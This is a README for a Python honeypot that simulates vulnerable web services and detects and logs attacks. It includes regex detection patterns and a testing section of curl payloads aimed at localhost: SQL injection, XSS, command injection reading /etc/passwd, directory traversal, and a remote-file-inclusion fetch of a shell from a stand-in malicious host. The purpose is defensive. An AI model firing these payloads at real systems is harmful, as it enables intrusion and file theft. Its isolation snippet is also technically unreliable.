# 🛡️ Analyzing Honeypot Architecture Through an Anatomic Lens

## A Python-based Honeypot System for Detecting and Analyzing Real-time Cyberattacks

[![Python](https://img.shields.io/badge/Python-3.8+-blue)](https://python.org)
[![MITRE](https://img.shields.io/badge/MITRE-T1595-red)](https://attack.mitre.org/techniques/T1595/)
[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Kali-orange)](https://www.kali.org)

---

## 📌 Overview

This project implements a **custom Python honeypot** that simulates vulnerable web services to attract, detect, and analyze cyberattacks in real-time. The system captures malicious payloads, logs attacker data in structured JSON format, and provides visual insights into attack patterns, helping security professionals understand threat actor behavior.

### Why This Honeypot?

🔴 **Early Threat Detection** - Identify attacks before they reach production systems  
🟠 **Threat Intelligence** - Collect attacker tactics, techniques, and procedures (TTPs)  
🟡 **Security Research** - Study attack patterns and emerging threats  
🟢 **Blue Team Training** - Realistic attack simulation for security teams  
🔵 **Vulnerability Discovery** - Identify zero-day and known exploits

### Key Capabilities

- ✅ **Multi-Attack Detection** - SQL Injection, XSS, Command Injection, RFI/LFI, Directory Traversal, Brute Force
- ✅ **Real-time Monitoring** - Live terminal alerts with color-coded attack notifications
- ✅ **Structured Logging** - JSON format with timestamp, IP, payload, and attack metadata
- ✅ **Data Visualization** - Automatic attack distribution charts using Matplotlib
- ✅ **Remote Access** - Ngrok integration for exposing honeypot to the internet
- ✅ **Isolated Environment** - Runs in VMware/VirtualBox for safe containment
- ✅ **Attack Classification** - Automated pattern matching using regex
- ✅ **Comprehensive Logging** - All interactions captured for forensic analysis

---

## 🏗️ System Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           SYSTEM ARCHITECTURE                          │
└─────────────────────────────────────────────────────────────────────────┘

┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌─────────────────┐
│   Attacker   │────▶│    Ngrok     │────▶│   Honeypot   │────▶│   Detection     │
│   Layer      │     │   Tunnel     │     │   Server     │     │   Engine        │
│              │     │   (Public)   │     │   (Port 80)  │     │   (Patterns)    │
└──────────────┘     └──────────────┘     └──────┬───────┘     └────────┬────────┘
                                                   │                      │
                                                   │                      ▼
                                                   │            ┌─────────────────┐
                                                   │            │   Real-time     │
                                                   │            │   Console       │
                                                   │            │   Alerts        │
                                                   │            └─────────────────┘
                                                   │                      │
                                                   ▼                      ▼
                                          ┌─────────────────┐    ┌─────────────────┐
                                          │   Logger        │    │   Analytics     │
                                          │   (JSON)        │    │   & Reporting   │
                                          │   Database      │    │   (Matplotlib)  │
                                          └─────────────────┘    └─────────────────┘
                                                   │                      │
                                                   ▼                      ▼
                                          ┌─────────────────┐    ┌─────────────────┐
                                          │   Attack        │    │   Threat        │
                                          │   Reports       │    │   Intelligence  │
                                          │   (CSV/PDF)     │    │   Feed          │
                                          └─────────────────┘    └─────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│                    ISOLATED ENVIRONMENT (VMware/VirtualBox)             │
└─────────────────────────────────────────────────────────────────────────┘
```

### Component Breakdown

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **Honeypot Server** | Python http.server | Simulates vulnerable web services |
| **Detection Engine** | Regex (re module) | Identifies attack patterns in requests |
| **Logger Module** | JSON | Structured logging of all attacks |
| **Alert System** | Terminal Output | Color-coded real-time alerts |
| **Visualization** | Matplotlib | Attack distribution charts |
| **Remote Access** | Ngrok | Secure tunneling for internet exposure |
| **Isolation** | VMware/VirtualBox | Sandboxed environment for safety |

---
### Attack Detection Patterns

```python
ATTACK_PATTERNS = {
    'SQL Injection': [
        r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
        r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
        r"union.*select",
        r"sleep\s*\([0-9]+\)"
    ],
    'XSS': [
        r"<script.*>",
        r"javascript:",
        r"onerror=",
        r"alert\s*\(",
        r"prompt\s*\(",
        r"confirm\s*\("
    ],
    'Command Injection': [
        r";\s*(ls|dir|pwd|cat|type|echo|wget|curl)",
        r"\|.*(ls|dir|pwd|cat)",
        r"&\s*(ls|dir|pwd|cat)",
        r"`.*`",
        r"\$\(.*\)"
    ],
    'Directory Traversal': [
        r"\.\./",
        r"\.\.\\",
        r"/etc/passwd",
        r"/windows/win.ini"
    ],
    'RFI/LFI': [
        r"include\s*\(.*\)",
        r"require\s*\(.*\)",
        r"http://",
        r"https://",
        r"file://"
    ],
    'Brute Force': [
        r"login.*fail",
        r"authentication.*error",
        r"invalid.*credentials",
        r"403.*forbidden"
    ]
}
```

---

## 🚀 Getting Started

### Prerequisites

- Python 3.8 or higher
- Ubuntu/Kali Linux (recommended)
- VMware or VirtualBox
- Ngrok account (free tier for remote access)
- 4GB RAM minimum
- 10GB free disk space
- Internet connection

### Installation

```bash
# 1. Clone the repository
git clone https://github.com/YOUR_USERNAME/honeypot-architecture-analysis.git
cd honeypot-architecture-analysis

# 2. Create virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Create logs directory
mkdir -p logs
mkdir -p reports

# 5. Configure Ngrok (optional for remote access)
ngrok authtoken YOUR_AUTH_TOKEN

# 6. Run the honeypot
python src/honeypot.py
```

### Directory Structure

```
honeypot-architecture-analysis/
├── src/
│   ├── honeypot.py           # Main honeypot server
│   ├── detector.py           # Attack detection engine
│   ├── logger.py             # JSON logging module
│   ├── visualizer.py         # Matplotlib visualization
│   ├── alert_system.py       # Real-time console alerts
│   └── config.py             # Configuration settings
├── logs/
│   ├── attacks.log           # All attacks log
│   ├── interactions.log      # All HTTP interactions
│   └── alerts.log            # Alert history
├── reports/
│   ├── attack_distribution.png # Visualization
│   ├── report_YYYYMMDD.csv     # Daily reports
│   └── summary.pdf             # Summary report
├── tests/
│   ├── test_detector.py      # Unit tests
│   └── test_logger.py        # Logger tests
├── screenshots/
│   ├── dashboard.png
│   ├── alert_console.png
│   └── attack_distribution.png
├── requirements.txt          # Python dependencies
├── setup.py                 # Installation script
└── README.md               # This file
```

---

## 🧪 Testing the Honeypot

### Simulate Various Attacks

```bash
# 1. SQL Injection Attacks
# Basic SQL Injection
curl "http://localhost:80/?id=1' OR 1=1--"

# Union-based SQL Injection
curl "http://localhost:80/?id=1 UNION SELECT username,password FROM users"

# Time-based SQL Injection
curl "http://localhost:80/?id=1' OR sleep(5)--"

# 2. XSS Attacks
# Basic XSS
curl "http://localhost:80/?q=<script>alert(1)</script>"

# IMG tag XSS
curl "http://localhost:80/?q=<img src=x onerror=alert(1)>"

# Encoded XSS
curl "http://localhost:80/?q=%3Cscript%3Ealert(1)%3C/script%3E"

# 3. Command Injection
# Basic command injection
curl "http://localhost:80/?cmd=; cat /etc/passwd"

# Pipe command injection
curl "http://localhost:80/?cmd=| ls -la"

# Backtick command injection
curl "http://localhost:80/?cmd=`whoami`"

# 4. Directory Traversal
# Unix traversal
curl "http://localhost:80/?file=../../etc/passwd"

# Windows traversal
curl "http://localhost:80/?file=..\\..\\windows\\win.ini"

# 5. RFI/LFI Attacks
# Local File Inclusion
curl "http://localhost:80/?page=../../etc/passwd"

# Remote File Inclusion
curl "http://localhost:80/?page=http://malicious.com/shell.txt"

# 6. Brute Force Attempts
# Simulate brute force login
for i in {1..50}; do
  curl -X POST http://localhost:80/login \
    -d "username=admin&password=password$i"
done
```

### Automated Testing Suite

```bash
# Run all tests
python -m pytest tests/

# Run specific test
python -m pytest tests/test_detector.py -v

# Run with coverage
coverage run -m pytest
coverage report -m

# Load test
python scripts/load_test.py --threads 50 --duration 60
```


### Sample Log Entry

```json
{
  "timestamp": "2026-06-06 14:23:45.123456",
  "source_ip": "192.168.1.100",
  "source_port": 54321,
  "target_port": 80,
  "protocol": "HTTP",
  "method": "GET",
  "uri": "/?id=1' OR 1=1--",
  "attack_types": ["SQL Injection"],
  "payload": "GET /?id=1' OR 1=1-- HTTP/1.1",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "attack_signature": "d41d8cd98f00b204e9800998ecf8427e",
  "severity": "CRITICAL",
  "confidence": 0.95,
  "raw_request": "GET /?id=1%27%20OR%201=1-- HTTP/1.1\r\nHost: localhost\r\nUser-Agent: curl/7.68.0\r\n\r\n"
}
```

### Real-time Console Alert

```
┌─────────────────────────────────────────────────────────────────┐
│ 🚨 ATTACK DETECTED!                                           │
├─────────────────────────────────────────────────────────────────┤
│ ⏰ Time:     2026-06-06 14:23:45                             │
│ 📍 Source:   192.168.1.100:54321                             │
│ 🎯 Target:   Port 80                                        │
│ 🔴 Type:     SQL Injection                                   │
│ 📝 Payload:  GET /?id=1' OR 1=1-- HTTP/1.1                 │
│ ⚠️ Severity: CRITICAL                                       │
│ 📊 Confidence: 95%                                          │
│ 🔑 Signature: d41d8cd98f00b204e9800998ecf8427e              │
│ 📋 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)   │
└─────────────────────────────────────────────────────────────────┘
```



## 🔐 Security Features

### Isolation & Containment

```python
# No external connections allowed
# All traffic contained in VM
# Processes run with limited privileges

import os
import subprocess

def isolate_environment():
    """Apply system-level isolation measures"""
    # Drop root privileges
    os.setgid(1000)
    os.setuid(1000)
    
    # Chroot jail
    subprocess.run(['chroot', '/var/honeypot'])
    
    # Apply systemd sandboxing
    subprocess.run(['systemd-run', '--sandbox', './honeypot.py'])
```

### Attack Pattern Database

```python
# Constantly updated attack signatures
ATTACK_SIGNATURES = {
    'SQL Injection': {
        'patterns': [r"(%27)|(\')|(--)", r"union.*select"],
        'severity': 'CRITICAL',
        'mitre_id': 'T1595'
    }
}
```

---

## 📈 Advanced Features

### 1. Machine Learning Integration

```python
# Anomaly detection using ML
from sklearn.ensemble import IsolationForest

def detect_anomalies(requests):
    model = IsolationForest(contamination=0.1)
    features = extract_features(requests)
    predictions = model.fit_predict(features)
    return predictions == -1  # Anomalies
```

### 2. Threat Intelligence Integration

```python
def check_threat_intel(ip):
    import requests
    # Check against multiple threat feeds
    feeds = [
        'https://feeds.alienvault.com/feeds/ip',
        'https://www.spamhaus.org/drop/drop.txt',
        'https://rules.emergingthreats.net/blockrules/emerging-rbn-ips.txt'
    ]
    # Query all feeds
```

### 3. Automated Reporting

```python
def generate_report():
    """Generate daily/weekly attack reports"""
    import matplotlib.pyplot as plt
    
    # Attack distribution
    plt.pie(attack_counts, labels=attack_types)
    plt.savefig('reports/daily_distribution.png')
    
    # Timeline visualization
    plt.plot(timeline, attack_counts)
    plt.savefig('reports/attack_timeline.png')
```

---

## 📊 Visualization Examples

### Attack Distribution Pie Chart

```python
import matplotlib.pyplot as plt

attacks = ['SQL Injection', 'XSS', 'Command Injection', 'Directory Traversal', 'RFI/LFI']
counts = [1810, 1358, 679, 453, 227]
colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6b6b']

plt.figure(figsize=(10, 8))
plt.pie(counts, labels=attacks, colors=colors, autopct='%1.1f%%', startangle=90)
plt.title('Attack Distribution Analysis')
plt.savefig('reports/attack_distribution.png', dpi=300)
```

### Attack Timeline

```python
# Time-series visualization
plt.figure(figsize=(12, 6))
plt.plot(timeline, daily_counts, marker='o', color='red')
plt.title('Attack Timeline - 30 Days')
plt.xlabel('Date')
plt.ylabel('Number of Attacks')
plt.grid(True)
plt.xticks(rotation=45)
plt.savefig('reports/attack_timeline.png', dpi=300)
```


---

## ⚠️ Ethical & Legal Disclaimer

> **This honeypot is for educational and defensive security research ONLY.**

### ✅ DO:
- Deploy only in controlled, isolated environments
- Use for security research and testing
- Monitor all activities
- Comply with all applicable laws
- Inform system owners (if applicable)
- Keep logs for security analysis

### ❌ DON'T:
- Deploy on unauthorized networks
- Use for malicious purposes
- Expose to the internet without proper safeguards
- Target systems without explicit consent
- Violate any laws or regulations
- Release attacker IP addresses publicly

*All attacks shown are SIMULATED in isolated environments with consent.*

---

## 📝 Configuration Options

### config.py

```python
# Honeypot Configuration
HOST = '0.0.0.0'
PORT = 80
LOG_LEVEL = 'DEBUG'
MAX_LOG_SIZE = 100 * 1024 * 1024  # 100MB
BANNER = "Welcome to vulnerable web server"

# Attack Detection
SQL_INJECTION_PATTERNS = [...]
XSS_PATTERNS = [...]
COMMAND_INJECTION_PATTERNS = [...]

# Alert Settings
CONSOLE_ALERTS = True
COLORED_OUTPUT = True
ALERT_THRESHOLD = 5  # alerts per minute

# Visualization
GENERATE_REPORTS = True
REPORT_INTERVAL = 'daily'  # daily, weekly, monthly
CHART_STYLE = 'dark_background'

# Logging
LOG_FORMAT = 'json'
ROTATE_LOGS = True
MAX_LOGS = 30  # days

# Security
DROP_PRIVILEGES = True
CHROOT_JAIL = True
ALLOWED_IPS = []  # Empty = allow all
```

---

## 📚 Resources & References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OWASP Top 10 Web Application Security Risks](https://owasp.org/Top10/)
- [Honeypot Technology Overview](https://www.cyber.gov.au/acsc/view-all-content/publications/honeypots)
- [Python http.server Documentation](https://docs.python.org/3/library/http.server.html)
- [Ngrok Documentation](https://ngrok.com/docs)

---

## 🤝 Contributing

We welcome contributions! Here's how you can help:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
4. **Push** to the branch (`git push origin feature/amazing-feature`)
5. **Open** a Pull Request

### Development Guidelines
- Follow PEP 8 style guide
- Write unit tests for new features
- Update documentation
- Use meaningful commit messages

---

## 📞 Support & Contact

- **GitHub Issues**: [Create an issue](https://github.com/YOUR_USERNAME/honeypot-architecture-analysis/issues)
- **Email**: honeypot-research@example.com
- **Twitter**: @HoneypotResearch

---

## 📄 License

MIT License - Free for educational and research use.

---

## 🌐 Quick Links

- **Source Code:** https://github.com/YOUR_USERNAME/honeypot-architecture-analysis
- **Documentation:** https://github.com/YOUR_USERNAME/honeypot-architecture-analysis/wiki
- **Report Issues:** https://github.com/YOUR_USERNAME/honeypot-architecture-analysis/issues
- **Telegram Alerts:** @HoneypotAlertBot
